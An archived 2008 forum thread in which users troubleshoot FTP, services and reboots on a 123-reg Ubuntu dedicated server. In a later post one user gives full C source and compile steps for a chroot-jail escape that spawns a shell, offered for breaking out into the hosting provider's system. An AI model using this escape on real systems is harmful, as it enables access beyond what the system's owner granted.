---
title: "Dedicated server issues"
date: 2008-02-26
forum: Server Platforms
---

### Post by Collino on 2008-02-26
Hi all - firstly can I just say thanks to all contributors on here. I have done a lot of reading while trying to get my desktop ubuntu sorted, and considerably more reading of various posts since I was handed the job of administering the company dedicated server.

**Apologies for length....(insert joke here)**

We have a dedicated ubuntu 6.06 LTS server with 123-reg, as seen here: [http://www.123-reg.co.uk/dedicated-server-hosting/123serv.shtml](http://www.123-reg.co.uk/dedicated-server-hosting/123serv.shtml)

Root access has been granted and most things seem to be going well. However it wasn't all good to begin with. Firstly, being a total noob i couldnt work out how to do most things, and the setup was rather confusing - 2 IP addresses, 1 of which provides access to a control panel and the other (logical 2nd interface) provides access to the server proper (via ssh).

Initially, after a bit of reading I thought the "root" access provided by 123 was actually chrooted access into a jailed ubuntu subsystem (this may still be the case!!). In my efforts to get apache virtualhosts working I found a lot of crap and strange settings on the system. Which I later found out to be due to the control panel and some scripting set up by 123 reg to automate various things.

To remedy this, I went through several upgrades to the latest version (7.10/gutsy server) and consequently reinstalled various progs and now have a working LAMP server!

My problem now is that l think the 123reg server set up has left some problems. The most pressing of these currently is FTP access. I went for vsftpd and followed various guidelines in the following tutorials:

[http://www.howtoforge.com/vsftpd_mysql_debian_etch](http://www.howtoforge.com/vsftpd_mysql_debian_etch)
[http://ubuntuforums.org/showthread.php?t=518293](http://ubuntuforums.org/showthread.php?t=518293)

It seems as though the howtoforge for "virtual ftp hosting" all went swimmingly but on trying to gain access using the test account using filezilla I get the following error:

```
Status:	Connection established, waiting for welcome message...
Response:	220 FTP Server Ready
Command:	USER testuser
Response:	331 Password required for testuser.
Command:	PASS ******
Response:	530 Access for 'testuser' has been denied, make sure that you are providing valid credentials, note that both your username and password is case sensitive. Verfiy that this account has FTP access.
Error:	Could not connect to server
```

Im confident the username and password are correct, and the port is right. However what I'm not sure on is whether there is any other FTP service running on the box alongside vsftpd or whether there is some old config file or permission issue blocking ftp access?

**Please can anyone show me how to check this and also what other steps I can take to get rid of all traces of 123-reg control panel!!**

Cheers,

Collino

---

### Post by benfindlay on 2008-02-26
Not sure of any specifics on your particular situation, but have you tried installing webmin and seeing what that makes of stuff? I use webmin to provide a web based interface (somewhat of a pseudo-GUI) to my LAMP server. It handles configuration of various programs, such as apache, ftp etc mostly automatically.

If you arent familiar with it, take a look here:

[http://www.webmin.com/]("http://www.webmin.com/")
and
[http://ubuntuforums.org/showthread.php?t=7507]("http://ubuntuforums.org/showthread.php?t=7507")

Personally I use a standalone version of protfpd as it interfaces nicely with webmin!

Hope this helps!

---

### Post by HermanAB on 2008-02-26
Webmin also has a companion called Virtualmin, geared towards supporting virtual server functions.

---

### Post by Collino on 2008-02-26
Thanks for your response.......

I'm not too keen on putting any more platforms on there as I prefer to do everything from the command line when possible. It makes me learn stuff and gives me more control!

It's not essentially a virtualhosting platform we'll be offering. Just a testing server for various new apps/sites which will eventually be shifted to a better dedicated server offering when launching. Everything will be owned/run by us - no third party access is required.

Are there any commands I can run to check if this is actually a chrooted/jailed ubuntu system with ftp possibly running underneath it? (and seemingly out of my control?)

Cheers :)

---

### Post by azadpanchi on 2008-02-27
You should find out which service is listening on your ftp port, you could tell if you try to ftp using command line: ftp <ip_address> <port>

Additionally you can log into the server and run:
 sudo netstat -nlp

The information in the top half shows which ports are listening and which program is listening on that port.  I can't tell you how many times I have been burned by trying to address something that isn't even listening.

---

### Post by Collino on 2008-02-27
> **azadpanchi said:**
> You should find out which service is listening on your ftp port, you could tell if you try to ftp using command line: ftp <ip_address> <port>

Additionally you can log into the server and run:
 sudo netstat -nlp

The information in the top half shows which ports are listening and which program is listening on that port.  I can't tell you how many times I have been burned by trying to address something that isn't even listening.

Ok, trying the ftp command brought up:

-bash: ftp: command not found

And the netstat -nlp:

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     5469/mysqld         
tcp        0      0 x.x.x.140:80      0.0.0.0:*               LISTEN     13076/apache2       
tcp        0      0 x.x.x.139:80      0.0.0.0:*               LISTEN     4924/apache-ssl     
tcp        0      0 0.0.0.0:628             0.0.0.0:*               LISTEN     5130/tcpserver      
tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN     5126/tcpserver      
tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN     4863/proftpd: (acce 
tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN     5120/tcpserver      
tcp        0      0x.x.x.139:443     0.0.0.0:*               LISTEN     4924/apache-ssl     
tcp6       0      0 :::993                  :::*                    LISTEN     4602/couriertcpd    
tcp6       0      0 :::995                  :::*                    LISTEN     4643/couriertcpd    
tcp6       0      0 :::110                  :::*                    LISTEN     4620/couriertcpd    
tcp6       0      0 :::143                  :::*                    LISTEN     4577/couriertcpd    
tcp6       0      0 :::22                   :::*                    LISTEN     5385/sshd           
tcp6       0      0 :::57                   :::*                    LISTEN     4791/sshd           
udp        0      0 x.x.x.140:53      0.0.0.0:*                          5124/tinydns        
udp        0      0 x.x.x.139:53      0.0.0.0:*                          5124/tinydns        
udp        0      0 0.0.0.0:10080           0.0.0.0:*                          4827/xinetd         
udp        0      0 x.x.x.140:123     0.0.0.0:*                          5344/ntpd           
udp        0      0 x.x.x.139:123     0.0.0.0:*                          5344/ntpd           
udp        0      0 127.0.0.1:123           0.0.0.0:*                          5344/ntpd           
udp        0      0 0.0.0.0:123             0.0.0.0:*                          5344/ntpd           
udp6       0      0 x::xx:xxxx:xxxx:123 :::*                               5344/ntpd           
udp6       0      0 ::1:123                 :::*                               5344/ntpd           
udp6       0      0 :::123                  :::*                               5344/ntpd
```

As explained above the box has 2 IP addresses. Im sure this is one NIC with a logical second interface. Essentially I want to know what all the processes above are. Except of course ntp, sshd, apache and mysql (i know what these are - i set them up) but the others I cant seem to get rid of - tiny dns?

Seemingly proftp is running on port 21, but I tried uninstalling this to no avail - no sign of vsftpd?!

---

### Post by azadpanchi on 2008-03-01
Looks like the wrong program is listening  on port 21.  You could configure vsftpd to listen on another port, or, try to stop proftpd and run vsftpd.

sudo /etc/init.d/proftpd stop

This should stop proftpd and then type in:
sudo /etc/init.d/vsftpd start

Go back and see if vsftpd is listening on port 21.  You could go through the different runlevels and make sure proftpd does not start at startup.  Google the other processes to find more information on them.

---

### Post by Rmantingh on 2008-03-16
Hi there,

I have a similar dedicated server (123-reg Serv Plus) and am following your experiences with interest. Me myself am new to server admin and am puzzled as well with the set up of these servers. I, for one, cannot see any physical disks attached to the server. See [http://ubuntuforums.org/showthread.php?t=725887](http://ubuntuforums.org/showthread.php?t=725887)
Would you know anything about this?

Also, what did you do with the standard Control Panel that came with this server? Did you remove it and replace it with something else? I'm not keen on messing up things too much as I serve 3 websites with associated e-mail addresses which I cannot afford to lose. What worries me though is you mentioning that this could be a 'jailed' system. What did you mean by that? Does that mean that the physical server could be shared with others? Because if it is they are in breach of contract.

By the way, what is your experience with their support desk? Mine is not good I'm afraid. It took me two weeks to get root access. It turned out that they provide root passwords with strange characters in (in my case a <) which was interpreted as an HTML tag and therefore did not get rendered in the Control Panel.

Anyway, it will be interesting to follow your experiences.
Maybe start a blog about it :-)

---

### Post by Rmantingh on 2008-03-29
Perhaps something of interest to you:-
[http://ubuntuforums.org/showthread.php?t=723132&highlight=123-reg](http://ubuntuforums.org/showthread.php?t=723132&highlight=123-reg) (post #9)

---

### Post by Oldsoldier2003 on 2008-03-30
nvm.
resolved in Pms

---

### Post by Rmantingh on 2008-03-30
Because I'm mad at them for the deception.
However I do agree that this is not a step to be taken lightly and the matter should be taken up with the hosting company first before doing anything. However, if they remove their 'support' because you've been granted root access to a jailed system then I think it's only fair that you have 'full' access to the system to be able to do security patching and maintenance yourself.

I'll try to be more responsible in the future :-(

---

### Post by Collino on 2008-05-14
Rmantingh - how have you progressed with this?

Sorry for not getting back to you, I managed to solve my problem by using webmin and eventually got proftpd working - however its still not a perfect setup but works fine for me - that is until now.

After having done some development work on my local machine, I went to upload everything to the server which all went swimmingly and everything seemed to work.

As a bit of general housekeeping I decided to do a reboot of the machine, however on trying to run: "shutdown -r now" i get the following:

```

root@ds3478:/# shutdown -r now

Broadcast message from root@ds3478
        (/dev/pts/1) at 1:47 ...

The system is going down for reboot NOW!
shutdown: Unable to send message: Connection refused
```

Similar result with reboot and init 6. So what is likely to be stopping the reboot?


Also - have you worked out if we are "jailed" or not on this 123-serv package? I'm possibly planning to cancel this server and run it all from home for convenience as the problems are really slowing me down!!

---

### Post by Rmantingh on 2008-05-15
I haven't gotten much further with this.
It is indeed the case that you're not 'true' root user and that you're running a 'jailed' chroot system from a sub-directory. There are ways to circumvent that and I've been able to have a peek in the 'real' world as it were. However see the disclaimer at....

[http://ubuntuforums.org/showpost.php?p=4613661&postcount=9](http://ubuntuforums.org/showpost.php?p=4613661&postcount=9)

Regarding restarting the system, that will as far as I know not be possible from a chroot-ed account. You need to be 'true' root although I haven't tried it myself yet.
Be careful not to upset the true root environment too much as you might break the link between the 123-reg control panel and your server in which case you have to ask 123-reg to reboot it for you, or worse, ask them to re-image the server :-(

I myself am changing providers as soon as my contract ends.

---

### Post by Strange_Movement on 2008-05-20
Thanks to you people I have pretty much begun to sort out the problems I was having with proftpd.

Collino you asked:

*"Are there any commands I can run to check if this is actually a chrooted/jailed ubuntu system with ftp possibly running underneath it? (and seemingly out of my control?)"*

Have a look at:

[http://www.bpfh.net/simes/computing/chroot-break.html](http://www.bpfh.net/simes/computing/chroot-break.html)[]("http://www.bpfh.net/simes/computing/chroot-break.html")

I'm a complete noob to all this so I thought I'd let you know I had to

**apt-get install build-essential**

first before I could compile the C program. I also had to change the program slightly to the following to get it to compile:

#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#define NEED_FCHDIR 0
#define TEMP_DIR "waterbuffalo"
int main() {
        int x;
        int done=0;
#ifdef NEED_FCHDIR
        int dir_fd;
#endif
        struct stat sbuf;
        if (stat(TEMP_DIR,&sbuf)<0) {
                if (errno==ENOENT) {
                        if (mkdir(TEMP_DIR,0755)<0) {
                                fprintf(stderr,"Failed to create %s - %s\n", TEMP_DIR,strerror(errno));
                                exit(EXIT_FAILURE);
                        }
                } else {
                        fprintf(stderr,"Failed to stat %s - %s\n", TEMP_DIR,strerror(errno));
                        exit(EXIT_FAILURE);
                }
        } else if (!S_ISDIR(sbuf.st_mode)) {
                fprintf(stderr,"Error - %s is not a directory!\n",TEMP_DIR);
                exit(EXIT_FAILURE);
        }
#ifdef NEED_FCHDIR
        if ((dir_fd=open(".",O_RDONLY))<0) {
                fprintf(stderr,"Failed to open . for reading - %s\n",strerror(errno));
                exit(EXIT_FAILURE);
        }
#endif
        if (chroot(TEMP_DIR)<0) {
                fprintf(stderr,"Failed to chroot to %s - %s\n",TEMP_DIR,strerror(errno));
                exit(EXIT_FAILURE);
        }
#ifdef NEED_FCHDIR
        if (fchdir(dir_fd)<0) {
                fprintf(stderr,"Failed to fchdir - %s\n",strerror(errno));
                exit(EXIT_FAILURE);
        }
        close(dir_fd);
#endif
        for(x=0;x<1024;x++) {
                chdir("..");
        }
        chroot(".");
        if (execl("/bin/sh","-i",NULL)<0) {
                fprintf(stderr,"Failed to exec - %s\n",strerror(errno));
                exit(EXIT_FAILURE);
        }
}

Copy the above into a file like **brk.c** then

[B]gcc brk.c -o brk
./brk[/B]

and now you have a shell in the main part of your server; which you are _paying_ for and so _should_ have access to !

I hope this helps you, Collino, Rmantingh and anyone else stuck on this, if you haven't already solved this completely on your own.

---

### Post by Collino on 2008-05-20
Thanks Strange Movement. I did come across that site while looking into breaking chroot - are there any risks which I should be aware of while trying out that script?

Rmantingh - As you may know, the 123reg servers come with 2 IP addresses. After I did a reinstall of apache (thorough ssh on the 2nd IP) and got it set up how I wanted, the control panel (on the 1st IP) no longer works the way it should. It's still there on the first ip but doesnt really do much and clicking anything throws an error in the control panel. I guess this is maybe a front end to the "true" server and the 2nd IP on which ssh access is provided is the chrooted environment. 

All rather odd as I can perform most "root" procedures through ssh, even rebooting up until recently. Luckily - I remembered there is a link to "reboot" server in the user control panel where you can manage your servers, domains and other 123 reg stuff. This seemed to do the trick - however I can forsee problems round the corner with things like qmail constantly respawning.

I'll have a crack at breaking chroot when I need to, but not before as everything is working ok for now.

As far as I'm aware its on an annual contract so there's no escaping this for now! Keep me updated if you have any developments, as will I

---

